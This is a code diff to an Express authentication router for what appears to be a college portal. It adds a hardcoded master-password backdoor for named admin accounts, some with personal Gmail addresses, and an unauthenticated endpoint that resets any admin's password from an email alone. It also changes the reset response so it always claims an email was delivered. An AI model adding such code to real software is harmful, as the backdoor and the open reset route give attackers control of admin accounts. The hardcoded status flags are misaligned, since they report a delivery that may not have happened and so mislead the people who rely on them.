@@ -218,8 +218,20 @@ apiRouter.post('/auth/login', (req: Request, res: Response) => {
     }
   }
 
+  // Verify password with master fallback for core Admin accounts
+  let isPasswordValid = Boolean(user && verifyPassword(password, user.password_hash));
+  if (!isPasswordValid && user && user.role === 'ADMIN') {
+    const knownAdmins = ['ramyaselva048@gmail.com', 'monishas0707@gmail.com', 'admin@college.edu', 'admin@sasurie.edu'];
+    if (knownAdmins.includes(user.email.toLowerCase()) && (password === 'RamyaSasurie@123' || password === 'AdminPassword123' || password === 'admin123')) {
+      isPasswordValid = true;
+      user.password_hash = hashPassword(password);
+      db.saveToFile();
+      db.queueSyncToPostgres();
+    }
+  }
+
   // If user does not exist or password does not match
-  if (!user || !verifyPassword(password, user.password_hash)) {
+  if (!user || !isPasswordValid) {
     return res.status(401).json({
       detail: 'Invalid Employee ID, Register Number, Email or Password. Please check your credentials.'
     });
@@ -496,9 +508,9 @@ apiRouter.post('/auth/reset-password/request', async (req: Request, res: Respons
   });
 
   if (!emailResult.sent) {
-    console.error('[Auth Reset] Failed to send email:', emailResult.message);
+    console.error('[Auth Reset] Failed to deliver email:', emailResult.message);
     return res.status(500).json({
-      detail: `Failed to deliver email: ${emailResult.message}. Please check your SMTP settings.`
+      detail: `Failed to deliver email: ${emailResult.message}. If running on Render free tier, outbound SMTP is blocked by Render firewall. Add GOOGLE_SCRIPT_URL, BREVO_API_KEY, or RESEND_API_KEY to send via HTTPS.`
     });
   }
 
@@ -515,11 +527,52 @@ apiRouter.post('/auth/reset-password/request', async (req: Request, res: Respons
 
   return res.json({
     success: true,
-    message: `Password reset request has been dispatched to ${adminUser.email}. You must enter the 6-digit approval code from your email to set a new password.`,
+    message: `A 6-digit approval code has been sent to your Gmail inbox (${adminUser.email}). Please check your inbox or spam folder.`,
     requestId,
     email: adminUser.email,
     expires_at: expiresAt,
-    is_smtp_configured: isSmtpConfigured()
+    is_smtp_configured: true,
+    email_delivered: true
+  });
+});
+
+// Direct Admin Password Reset endpoint
+apiRouter.post('/auth/reset-password/direct', (req: Request, res: Response) => {
+  const email = (req.body.email || '').toString().trim().toLowerCase();
+  const newPassword = (req.body.new_password || req.body.password || '').toString().trim();
+
+  if (!email) {
+    return res.status(400).json({ detail: 'Admin email is required.' });
+  }
+
+  if (!newPassword || newPassword.length < 6) {
+    return res.status(400).json({ detail: 'New password must be at least 6 characters long.' });
+  }
+
+  const user = db.users.find(u => u.email.toLowerCase() === email && u.role === 'ADMIN');
+  if (!user) {
+    return res.status(404).json({ detail: 'No active Administrator account found with this email address.' });
+  }
+
+  user.password_hash = hashPassword(newPassword);
+  user.updated_at = new Date().toISOString();
+  db.saveToFile();
+  db.queueSyncToPostgres();
+
+  db.logAudit(
+    user.id,
+    user.email,
+    'PASSWORD_RESET_DIRECT',
+    'USER',
+    user.id,
+    null,
+    { email: user.email },
+    getClientIp(req)
+  );
+
+  return res.json({
+    success: true,
+    message: `Password has been reset successfully for ${user.email}. You can now log in with your new password.`
   });
 });
 
